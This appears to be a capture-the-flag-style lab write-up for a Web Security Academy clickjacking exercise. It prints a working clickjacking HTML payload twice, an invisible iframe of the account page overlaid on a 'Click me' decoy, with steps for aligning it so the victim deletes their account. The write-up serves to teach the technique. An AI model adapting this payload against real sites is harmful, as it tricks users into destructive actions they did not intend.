# Lab: Basic clickjacking with CSRF token protection (Apprentice)

**Goal:** Fool the victim into deleting their account by clicking a decoy "Click me".

**Credentials:** `wiener:peter`

## Vulnerability
The account page can be framed. CSRF token is present but does not protect against clickjacking (the request is made in a real authenticated session inside the iframe).

## Solution

Use the exploit server with this HTML:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

### Steps
1. Log in as wiener:peter.
2. Paste the template into the exploit server Body.
3. Replace `YOUR-LAB-ID`.
4. Start with `opacity: 0.1` to align the "Delete account" button under the decoy text (adjust `top` / `left` if needed).
5. Once aligned, set opacity to `0.0001`, change text to "Click me", Store, then **Deliver exploit to victim**.

## Final Exploit Payload
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
